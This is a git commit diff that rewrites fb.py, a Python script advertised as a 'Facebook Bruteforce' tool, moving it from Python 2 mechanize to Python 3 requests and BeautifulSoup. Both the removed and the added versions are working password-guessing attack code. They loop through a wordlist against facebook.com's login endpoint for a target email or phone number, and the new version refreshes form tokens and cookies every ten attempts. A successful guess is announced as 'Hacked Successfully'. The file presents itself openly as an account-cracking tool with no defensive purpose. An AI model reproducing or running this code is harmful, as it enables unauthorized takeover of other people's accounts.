79a4b74244db5f06ede4c99ce6b30bdb47d56064
Mr robot <30386159+edmark21@users.noreply.github.com>
2021-12-26 15:05:19 +0800

    fb.py

--- fb.py
+++ fb.py
@@ -1,128 +1,80 @@
-reset='\033[0m'
-bold='\033[01m'
-disable='\033[02m'
-underline='\033[04m'
-reverse='\033[07m'
-strikethrough='\033[09m'
-invisible='\033[08m'
-    
-black='\033[30m'
-red='\033[31m'
+import os.path
+import requests
+from bs4 import BeautifulSoup
+import sys
+
 green='\033[32m'
-orange='\033[33m'
-blue='\033[34m'
-purple='\033[35m'
-cyan='\033[36m'
-lightgrey='\033[37m'
-darkgrey='\033[90m'
-lightred='\033[91m'
-lightgreen='\033[92m'
+reset='\033[0m'
 yellow='\033[93m'
-lightblue='\033[94m'
-pink='\033[95m'
-lightcyan='\033[96m'
-
-black='\033[40m'
-red='\033[41m'
-green='\033[42m'
-orange='\033[43m'
-blue='\033[44m'
-purple='\033[45m'
-cyan='\033[46m'
-lightgrey='\033[47m'
+cyan='\033[36m'
 
 
-import sys,time,os
-import mechanize
-import cookielib
-import random
-os.system('clear')
-print ('Hack the world')
-time.sleep(2)
-os.system('clear')
+lo = '''
+
+           Edmark.net 
+      Facebook Bruteforce
+          Version: V1
+      Edmark Jay Sumampen
 
 
+'''
 
-print("                                   Edmark.net ")
-print("                              Facebook Bruteforce")
-print("                                  Version: V5.5")
-print("                         Created by: Edmark Jay Sumampen")
+if sys.version_info[0] != 3:
+    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
+    fb.py\n\t--------------------------------------''')
+    sys.exit()
 
-
-print
-
-
-
-#email
-email = str(raw_input(cyan + "\n\nEmail or Phone: " + reset))
-wp = 'password.txt'
-#wordlist
-passwordlist = str(raw_input(cyan + "WordListPath / Enter to Start: " + reset)) + wp
-
-#Target Website
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-
-#useragents
-useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-def main():
-	global br
-	br = mechanize.Browser()
-	cj = cookielib.LWPCookieJar()
-	br.set_handle_robots(False)
-	br.set_handle_redirect(True)
-	br.set_cookiejar(cj)
-	br.set_handle_equiv(True)
-	br.set_handle_referer(True)
-	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-	welcome()
-	search()
-	print("Password does not exist in the wordlist")
-	exit()
-	
-	
+PASSWORD_FILE = "password.txt"
+MIN_PASSWORD_LENGTH = 6
+POST_URL = 'https://www.facebook.com/login.php'
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+}
+PAYLOAD = {}
+COOKIES = {}
 
 
+def create_form():
+    form = dict()
+    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 
-def brute(password):
-	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
-	sys.stdout.flush()
-	br.addheaders = [('User-agent', random.choice(useragents))]
-	site = br.open(login)
-	br.select_form(nr = 0)
-	br.form['email'] = email
-	br.form['pass'] = password
-	sub = br.submit()
-	log = sub.geturl()
-	if log != login and (not 'login_attempt' in log):
-			print(green + "\n[+] Email/Phone: " + email + " Password: {}".format(password))
-			print(green + "[+] " + email + " Has been Hacked Successfully!!!" + reset) 
-			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
-			if m == 'y':
-				exit()
-			elif m == 'n':
-				os.system("clear")
-				os.system("python2 fb.py")
-				
+    data = requests.get(POST_URL, headers=HEADERS)
+    for i in data.cookies:
+        cookies[i.name] = i.value
+    data = BeautifulSoup(data.text, 'html.parser').form
+    if data.input['name'] == 'lsd':
+        form['lsd'] = data.input['value']
+    return form, cookies
 
 
-def search():
-	global password
-	passwords = open(passwordlist,"r")
-	for password in passwords:
-		password = password.replace("\n","")
-		brute(password)
+def is_this_a_password(email, index, password):
+    global PAYLOAD, COOKIES
+    if index % 10 == 0:
+        PAYLOAD, COOKIES = create_form()
+        PAYLOAD['email'] = email
+    PAYLOAD['pass'] = password
+    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+        open('temp', 'w').write(str(r.content))
+        print(green + "\n[+] Email/Phone: " + email + " \nPassword: {}".format(password))
+        print(green + "[+] " + email + " Has been Hacked Successfully!!!" + reset) 
+        
+        return True
+    return False
 
 
-#welcome 
-def welcome():
-	total = open(passwordlist,"r")
-	total = total.readlines()
-	print
-	print (" [*] Account to crack : {}".format(email))
-	print " [*] Possible Password: " , len(total)
-	print (" [*] Cracking, please wait ...\n\n")
-
-
-if __name__ == '__main__':
-	main()
+if __name__ == "__main__":
+    print(lo)
+    if not os.path.isfile(PASSWORD_FILE):
+        print("Password file is not exist: ", PASSWORD_FILE)
+        sys.exit(0)
+    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
+    
+    email = input(cyan + 'Email or Phone: ' + reset).strip()
+    for index, password in zip(range(password_data.__len__()), password_data):
+        password = password.strip()
+        if len(password) < MIN_PASSWORD_LENGTH:
+            continue
+        print(yellow + "[*] Trying ..... [", index, "]: ", password + reset)
+        if is_this_a_password(email, index, password):
+            break
